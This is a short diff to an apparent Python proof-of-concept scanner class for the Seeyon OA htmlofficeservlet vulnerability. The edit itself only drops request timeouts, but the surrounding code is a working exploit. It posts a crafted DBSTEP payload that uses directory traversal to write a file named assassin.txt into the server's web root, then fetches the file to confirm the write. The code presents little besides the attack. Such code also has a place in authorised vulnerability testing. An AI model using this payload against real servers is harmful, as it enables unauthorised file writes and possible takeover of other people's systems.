@@ -63,7 +63,7 @@ class poc:
     def vuln(self, netloc, scheme):
         url = "{}://{}/seeyon/htmlofficeservlet".format(scheme, netloc)
         try:
-            result_check = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result_check = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
             if "htmoffice" in result_check.text:
                 file_name = self.encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\assassin.txt')
                 payload = "DBSTEP V3.0     355             0               10             DBSTEP=OKMLlKlV\r\n"
@@ -77,9 +77,9 @@ class poc:
                 payload += "needReadFile=yRWZdAS6\r\n"
                 payload += "originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n"
                 payload += "assassin"
-                requests.post(url=url, data=payload, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+                requests.post(url=url, data=payload, headers=self.headers, verify=False, proxies=self.proxies)
                 url_check = "{}://{}/seeyon/assassin.txt".format(scheme, netloc)
-                result = requests.get(url=url_check, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+                result = requests.get(url=url_check, headers=self.headers, verify=False, proxies=self.proxies)
                 if "assassin" in result.text:
                     target = urlparse(url)
                     self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意命令执行漏洞\033[0m
